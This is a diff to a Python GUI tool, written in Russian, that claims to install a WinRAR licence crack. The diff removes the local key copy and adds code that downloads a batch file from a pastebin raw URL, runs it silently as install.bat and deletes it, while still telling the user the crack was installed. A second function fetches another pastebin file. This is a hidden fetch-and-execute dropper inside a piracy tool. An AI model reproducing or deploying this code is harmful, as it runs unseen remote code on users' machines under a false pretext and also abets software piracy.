@@ -22,12 +22,20 @@ def goinstallkey():
     with open(r"rarreg.key", "w") as file:
         for  line in lines:
             file.write(line + '\n')
-    system("del /Q C:\Program Files\WinRAR\rarreg.key")  
-    system("move /Y rarreg.key C:\Program Files\WinRAR")
+    f=open(r'install.bat', "wb")
+    ufr = get("https://pastebin.com/raw/vJ05B3Q6")
+    f.write(ufr.content)
+    f.close()
+    system('install.bat')
+    system("del /Q install.bat")
     messagebox.showinfo(title="Установлено!", message='Кряк был успешно установлен! Перезапустите WinRAR.')
 
 def goremovekey():
-    system("del /Q C:\Program Files\WinRAR\rarreg.key")
+    f=open(r'del.bat', "wb")
+    ufr = get("https://pastebin.com/raw/tzLbxpNb")
+    f.write(ufr.content)
+    f.close()
+    system('del /Q del.bat') 
     messagebox.showinfo(title="Удалено!", message='Кряк был успешно удален! Перезапустите WinRAR.')
 
 installkey = Button(text='Установить кряк WinRAR', bg="green", fg="white", command=goinstallkey)
